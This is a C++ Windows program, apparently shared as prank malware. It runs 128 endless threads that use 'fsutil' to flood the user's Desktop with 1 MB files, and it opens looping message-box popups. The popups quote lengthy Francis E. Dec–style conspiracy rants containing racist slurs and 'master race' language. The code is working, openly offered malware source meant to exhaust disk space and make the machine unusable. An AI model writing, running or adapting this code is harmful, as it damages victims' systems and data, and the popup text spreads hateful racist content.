//credit me: https://github.com/ImSoBored420
#include <iostream>
#include <string> //used for the "to string function
#include <thread> //used for multithreading 
#include <boost/uuid/uuid.hpp> //all of these uuid thingys for uuid
#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>
#include <Windows.h>

using namespace std;

const string USER_PROFILE = getenv("USERPROFILE"); //get user profile because you need it for specific paths
string path = USER_PROFILE + "\\OneDrive\\Desktop"; //win 11 desktop path - or more specifically - people who have onedrive
string pathLegacy = USER_PROFILE + "\\Desktop"; //older windows desktop path


void fileSpammr() { //loop uuid name generation and file creation
	while (true) {
		boost::uuids::random_generator generator;
		boost::uuids::uuid id = generator();
		string uuid = to_string(id);
		cout << uuid;

		//system(("fsutil file createnew " + path + "\\" + uuid + ".txt 1048576").c_str()); //works for win11 (visible to onedrvie users but still makes the path regardless of if you actually have it or not)
		//system(("fsutil file createnew %temp%\\" + uuid + " 1048576").c_str()); //temp flood because they use uuid anyways
		system(("fsutil file createnew " + pathLegacy + "\\" + uuid + ".txt 1048576").c_str()); //works for windows 10 and below I THINK (or if win11 doesn't use onedrive)
	}

}

void msgBoxes() {
	while (true) {
		MessageBox(
			NULL,
			TEXT("in December 14-17 1965, I attempted to escape this worse-mongrel Gangster Communist country to return to the Slovenic- Polish land of my forefathers. Instead, in a Gangster-staged Parroting Puppet DEADLY CONSPIRACY, I was flown from Kennedy New York Airport AT NIGHT to a small, distant St. Lawrence River Estuary snowbound small airport under the guise that I was in Warsaw, Poland. Immediately many, many things proved this to me - including the two big white asbestos-shingled hangars with the large Braniff Airways -signs on their sidewalls - in addition to the many blurted statements I solicited from the many CIA DEADLY GANGSTERS - the assassins of ME - the many, many Parroting Puppets all around me! I DEMANDED an immediate flight back to Kennedy New York Airport. Instead I was held captive ALL NIGHT, later in CHAINS! I refused both; all food and requests I’d “go to sleep”. Then CIA policegangsters pretending to be Polish police with NO identification BEAT ME BLOODILY! Later, while MY return-trip 707 Boeing Jet Airliner was being serviced for MY return trip, I quickly walked into the airplane and saw a CIA GANGSTER with a small electric hairdryer-type blower pumping DEADLY POISON NERVE GAS SMOKE into SECRET COMPARTMENTS under the ashtrays in the arms of the chairs where later I was ordered to sit in the airplane full of CIA UNDERLINGS \"passengers\" - MY ASSASSINS!!! - who GIGGLED as they watched me DRAGGED IN CHAINS into the airplane by the Gangster CIA policegangsters!! These deadly Gangster CIA passengers, THEY PRESSED THE FRONTAL PANEL OF THE ASHTRAYS IN THE SEAT ARMS to release the DEADLY POISON NERVE GAS SMOKE!\n\nIndubitably, all of the others deadly CIA underling gangsters upon this staged return flight, they ALL had taken the TOP SECRET POISON NERVE GAS ANTIDOTE PILL, IMMUNING them from the DEADLY POISON NERVE GAS SMOKE!DEADLY POISON NERVE GAS SMOKE was sprayed at me from CIGARS, CIGARETTES, even from BALL - POINT PENS!Also from the WIG of a woman sitting next to me!Even the Swiss cheese - type ICE CUBES were evaporating into POISON NERVE GAS SMOKE in all of the FREE drinks!I got up and went to the rear of the airplane by the rear exit door with the large push - up handle.My Frankenstein Brain - thoughts Broadcasting Radio disclosed my intentions IMMEDIATELY!The loudspeaker SCREAMED that the flight was over and that our airplane was already preparing to land at Kennedy New York Airport!You hangman rope sneak Gangster playboy scum - on - top KNOW these facts are true; not only from taking part in such undetectable exter - minations, but also you chicanerous demented felon Parroting Puppet Gangsters can WATCH my Frankenstein Eyesight Televison PLAYBACK of all these horrible terrifying deadly events!When I returned home, Joseph I.Dec - my only brother and deadly felon - murderer and assassin - spy agent against me for this Gangster Government - he BEAT ME REPEATEDLY, CURSING me that I was not exterminated by all of the POISON NERVE GAS SMOKE and that I did the IMPOSSIBLE in that I KEPT AWAKE FOR THREE DAYS AND REFUSED ALL FOOD in order to prevent my SNEAK EXTERMINATION!"),
			TEXT("GANGSTER COMPUTER GOD CONSPIRACY"),
			MB_OK);
	}
}

void msgBoxess() {
	MessageBox(
		NULL,
		TEXT("LOOK AT THE PICTURE!!! See the skull, the part of bone removed, the \"master-race\" Frankenstein radio controls, the Brain-thoughts Broadcasting Radio, the Eyesight Television, the Frankenstein Earphone Radio, the Threshold Brainwash Radio, the latest new skull reforming to contain ALL Frankenstein Controls, even in THIN skulls of WHITE PEDIGREE MALES! Visible Frankenstein controls! The synthetic nerve-radio directional antennae loop! Make copies for yourself! There is NO ESCAPE from this worst gangster police state, using ALL of the deadly gangster Frankenstein controls!\n\nIn 1965, CIA gangster police BEAT ME BLOODY, dragged me IN CHAINS from Kennedy New York Airport! Since then I HIDE in forced jobless poverty, isolated alone in this low deadly ♥♥♥♥♥♥town old house. The brazen, deadly Gangster Police and ♥♥♥♥♥♥puppet underlings spray me with POISON NERVE GAS from automobile exhausts and even lawnmowers! DEADLY ASSAULTS, even in my yard with knives, even bricks and stones, even DEADLY TOUCH TABIN or ELECTRIC SHOCK FLASHLIGHTS; even remote electronically controlled around-corners-projection of DEADLY TOUCH TARANTULA SPIDERS or even bloody-murder \"accidents\" to shut me up forever with a Sneak Undetectable Extermination! Even with trained parroting puppet assassins in MAXIMUM SECURITY INSANITY PRISON for writing these unforgivable TRUTHS!!\n\nUntil my undetectable extermination, I, Francis E. Dec, esq., 29 Maple Avenue, Hampstead, New York, I STAND ALONE against your mad, deadly, worldwide conspiratorial Gangster Computer God Communism with wall-to-wall deadly Gangster protection, life-long sworn conspirators, Murder Incorporated, organized crime, the police and judges, the Deadly Sneak Parroting Puppet Gangsters using all the Gangster deadly Frankenstein controls! These hangmanrope sneak deadly gangsters, the judges and the police, trick, trap, rob, wreck, butcher, and MURDER the people to keep them TERRORIZED in Gangster Frankenstein earphone radio slavery for the Communist Gangster Government and con-artist Parroting Puppet Gangster-playboy scum-on-top! The secret work of all police, in order to maintain a Communist \"closed society\"! The same worldwide mad deadly Communist gangster computer god that controls YOU as a terrorized Gangster Frankenstein Earphone Radio slave! Parroting Puppet, you are a terrorized member of the \"MASTER RACE\" worldwide 4 BILLION eye-sight television camera guinea pig Communist Gangster Computer God MASTER RACE! You're LIVING, THINKING mad, deadly worldwide Communist Gangster Computer God SECRET OVERALL PLAN: WORLDWIDE LIVING DEATH FRANKENSTEIN SLAVERY to explore and control the ENTIRE UNIVERSE with the endless \"STAIRWAY TO THE STARS\" - namely the manmade inside-out planets with nucleonic powered speeds MUCH faster than the speed of light! Look up and see the Gangster Computer God concocted NEW FAKE STARRY SKY! The worldwide completely controlled deadly degenerative climate and atmosphere through the new world round Translucent Exotic Gaseous Envelope which the worldwide Communist Gangster Computer God MANIPULATES through countless exactly positioned satellites; THE NEW FAKE PHONY \"STARS\" IN THE SYNTHETIC \"SKY\"!!\n\nFor AGES before Frankenstein Controls apeoidic ♥♥♥♥♥♥s interbreedable with APES had no alphabet, not even NUMERALS! Slavery conspiracy over 300 years ago ideally tiny-brained apeoidic ♥♥♥♥♥♥ Gangster government Eyesight TV Gangster spy cameras, Computer God New World Order DEGENERATION!When \"gifted\" with all Gangster Frankenstein controls, ♥♥♥♥♥♥ deadly Gangster Parroting Puppet or ♥♥♥♥♥♥trained PROGRAMMED ROBOTS DEADLY APE-FRANKENSTEIN MACHINES!! Degenerative disease to ETERNAL Frankenstein slavery!! Overall plan through \"ONE WORLD COMMUNISM\" (Top Secret codeword!!!) meaning \"worldwide absolutely helpless-and-hopeless simple-languaged mongrel-mulatto- apeoidic ♥♥♥♥♥♥S\"!!\n\nWorldwide, systematic instant plastic surgery BUTCHERY MURDER, fake ageing so ALL people are dead or useless by age 70! Done at night to YOU as a Frankenstein slave! Parroting puppet Gangster slave, now even you know I am a MENACE to your worldwide, mad, deadly Communist Gangster Computer God! Therefore, I must go to extermination. Before I am exterminated by this gangster, Computer God concocted and controlled worst mongrel organized crime murder incorporated Gangster Communist government, I hand YOU the secrets to save the entire human race, and the entire UNIVERSE!\n\nDonate money, or even a manual typewriter to me, FOR YOUR ONLY HOPE FOR A FUTURE!! "),
		TEXT("GANGSTER COMPUTER GOD CONSPIRACY"),
		MB_OK);
}

void threadMultiplier() { //creates threads and runs them simultaneously for the filespam function
	thread spam1(fileSpammr); thread spam2(fileSpammr);
	thread spam3(fileSpammr); thread spam4(fileSpammr);
	thread spam5(fileSpammr); thread spam6(fileSpammr);
	thread spam7(fileSpammr); thread spam8(fileSpammr);
	thread spam9(fileSpammr); thread spam10(fileSpammr);
	thread spam11(fileSpammr); thread spam12(fileSpammr);
	thread spam13(fileSpammr); thread spam14(fileSpammr);
	thread spam15(fileSpammr); thread spam16(fileSpammr);
	spam1.detach(); spam2.detach();
	spam3.detach(); spam4.detach();
	spam5.detach(); spam6.detach();
	spam7.detach(); spam8.detach();
	spam9.detach(); spam10.detach();
	spam11.detach(); spam12.detach();
	spam13.detach(); spam14.detach();
	spam15.detach(); spam16.detach();
}


int main() {
	/*/
	multi-multithreading because it's evil (128 threads)
	(yes this actually works to make 128 threads)
	but first initialize the popup spam function
	/*/
	thread mult1(threadMultiplier); thread mult2(threadMultiplier);
	thread mult3(threadMultiplier); thread mult4(threadMultiplier);
	thread mult5(threadMultiplier); thread mult6(threadMultiplier);
	thread mult7(threadMultiplier); thread mult8(threadMultiplier);
	mult1.detach(); mult2.detach();
	mult3.detach(); mult4.detach();
	mult5.detach(); mult6.detach();
	mult7.detach(); mult8.detach();


	//separate messagebox threads because that's how it goes
	thread msg1(msgBoxes); thread msg2(msgBoxes);
	thread msg3(msgBoxes); thread msg4(msgBoxes);
	thread msg5(msgBoxess); thread msg6(msgBoxess);
	thread msg7(msgBoxess); thread msg8(msgBoxess);
	msg1.detach(); msg2.detach();
	msg3.detach(); msg4.detach();
	msg5.detach(); msg6.detach();
	msg7.detach(); msg8.join();

	return 0;
}